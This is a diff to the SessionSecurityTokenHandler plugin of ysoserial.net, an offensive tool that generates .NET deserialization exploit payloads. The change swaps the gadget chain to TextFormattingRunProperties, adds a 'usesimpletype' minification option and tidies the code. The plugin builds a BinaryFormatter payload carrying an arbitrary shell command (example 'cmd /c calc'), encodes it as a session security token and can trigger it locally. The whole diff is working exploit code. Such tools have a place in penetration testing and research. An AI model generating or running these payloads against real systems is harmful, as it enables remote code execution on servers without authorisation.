@@ -6,6 +6,7 @@ using System.IdentityModel;
 using System.IO;
 using System.Xml;
 using System.IdentityModel.Tokens;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -24,14 +25,16 @@ namespace ysoserial.Plugins
     class SessionSecurityTokenHandlerPlugin : Plugin
     {
         static string command = "";
-        static Boolean test = false;
-        static Boolean minify = false;
+        static bool test = false;
+        static bool minify = false;
+        static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
                 {"c|command=", "the command to be executed e.g. \"cmd /c calc\"", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
-                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null }
+                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
 
         public string Name()
@@ -78,7 +81,7 @@ namespace ysoserial.Plugins
 
             if (minify)
             {
-                payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
@@ -89,7 +92,7 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
+            byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
             DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
             ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform();
             byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
@@ -105,7 +108,7 @@ namespace ysoserial.Plugins
                     SessionSecurityTokenHandler mySessionSecurityTokenHandler = new SessionSecurityTokenHandler();
                     mySessionSecurityTokenHandler.ReadToken(tokenXML);
                 }
-                catch (Exception e)
+                catch
                 {
                     // there will be an error!
                 }
@@ -113,7 +116,7 @@ namespace ysoserial.Plugins
 
             if (minify)
             {
-                payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             return payload;
